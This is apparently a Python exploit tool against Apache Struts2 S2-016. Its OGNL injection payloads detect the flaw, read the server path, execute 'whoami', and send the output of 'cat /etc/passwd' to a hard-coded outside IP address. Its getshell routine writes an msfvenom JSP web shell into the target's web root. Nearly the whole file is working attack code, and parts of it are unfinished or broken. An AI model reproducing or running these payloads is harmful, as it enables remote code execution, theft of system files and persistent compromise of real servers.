#!/usr/bin/env python
# encoding: utf-8

import requests
import os
import sys
sys.path.append('../')
import re
from optparse import OptionParser
import threading
from Queue import Queue
import time
import hashlib


from pocsuite.lib.core.data import logger
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.exception import PocsuiteThreadException


class Struts2(object):

    def __init__(self):
        pass


    def struts_005(self):
        pass


    def _struts_016_poc(self, url):

        print '\n--------------* poc *--------------'

        hash_sign = hashlib.md5('vulned').hexdigest()

        poc_1 = '?action:%25{3*4}'
        poc_2 = '?redirect:%25{3*4}'
        poc_3 = "redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22" + hash_sign + "%22),%23p.close()}"

        url_poc_1 = url +poc_1
        response = requests.get(url_poc_1)
        if "12.jsp" in response.content:
            print 'poc:', poc_1, 'successfully...'

        url_poc_2 = url + poc_2
        response = requests.get(url_poc_2)
        if "/12" in response.url:
            print 'poc:', poc_2, 'successfully...'

        url_poc_3 = url + poc_3
        response = requests.get(url_poc_3)
        if hash_sign in response.content:
            print 'poc:', poc_3, 'successfully...'



    def _struts_016_exp(self, url):

        print '\n--------------* exploit *--------------'
        # get file directory
        exp_1 = "?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"

        # code excution 1
        exp_2 = "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"

        # code excution 2
        # send excute result to remote server
        exp_3 = "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'cat', '/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d\"http://45.32.250.207/result%3d\".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(\"GET\"),%23http.connect(),%23http.getInputStream()}"


        url_exp_1 = url + exp_1
        response = requests.get(url_exp_1)
        print 'directory:', response.text

        url_exp_2 = url + exp_2
        response = requests.get(url_exp_2, timeout=10)
        print response.content

        url_exp_3 = url + exp_3
        response = requests.get(url_exp_3, timeout=10)
        # print response.content


    def _struts_016_getshell(self, url):

        '''
        upload the shell.jsp that msfven generates to website
        '''

        print '---------------* shell *---------------'

        shell_content = open('shell.jsp', 'r').read()
        shellname = 'test.jsp'
        payload = '''redirect:${{%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3dfalse%2c%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%5d%2c%23b%3dnew+java.io.FileOutputStream(new+java.lang.StringBuilder(%23a.getRealPath(%22/%22)).append(@java.io.File@separator).append(%22{shellname}%22))%2c%23b.write(%23a.getParameter("t").getBytes())%2c%23b.close%28%29%2c%23p%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.getWriter%28%29%2c%23p.println%28%22DONE%22%29%2c%23p.flush%28%29%2c%23p.close%28%29}}'''.format(shellname=shellname)
        url_getshell = url + '?' + payload
        data = {'t': shell_content}

        try:
            response = requests.post(url_getshell, data=data, timeout=10)

            # print shell path
            rawurl = url
            url = url.replace('http://', '')
            url = url.replace('https://', '')
            split_url = url.split('/')
            shell_path = ''

            if len(split_url) > 2:
                shell_path = split_url[0] + '/' + split_url[1]
            else:
                shell_path = split_url[0]

            print 'shell url:', rawurl.split('//')[0] + '//' + shell_path + '/' + shellname

        except Exception, e:
            print e


    def struts_016(self, url):
        """
        Affected version:
        Struts 2.0.0 - Struts 2.3.15
        """
        self._struts_016_poc(url)
        self._struts_016_exp(url)
        self._struts_016_getshell(url)


    def struts_019(self):
        pass


    def struts_032(self):
        pass


    def struts_033(self):
        pass


    def struts_037(self):
        pass



def main(thread_nums, url, domain, dirs):

    struts2 = Struts2()
    url = 'http://192.168.1.116:8080/blank_3_14/example/HelloWorld.action'

    if url is not None:
        struts2.struts_016(url)

    if domain is not None:
        for d in open('dirs'):
            url = 'http://{domain}{dir_str}'.format(
                                               domain=domain,
                                               dir_str=d)
            struts.struts_016(url)



if __name__ == '__main__':
    os.system('clear')

    """
    default threads is 1

    if url(-u) is used, then url is only one url, else then read urls.txt from current directory
    if domain(-d) is used, then dirs(-f) should be used, default dirs files is dirs.txt

    eg:
    1. python struts2.py -u http://example.com/xx.action
    2. python strutsw.py -t 10 -d example.com -f dirs2.txt
    """

    parser = OptionParser()
    parser.add_option("-t", "--threads",
                      dest="thread_nums",
                      type="int",
                      help="Number of threads")
    parser.add_option("-u", "--url",
                      dest="url",
                      type="string",
                      help="Checking url")
    parser.add_option("-d", "--domain",
                      dest="domain",
                      type="string",
                      help="Checking domain")
    parser.add_option("-f", "--dirs",
                      dest="dirs",
                      type="string",
                      help="Checking directorys")

    # main(parser.thread_nums, parser.url, parser.domain, parser.dirs)
    main(None, None, None, None)
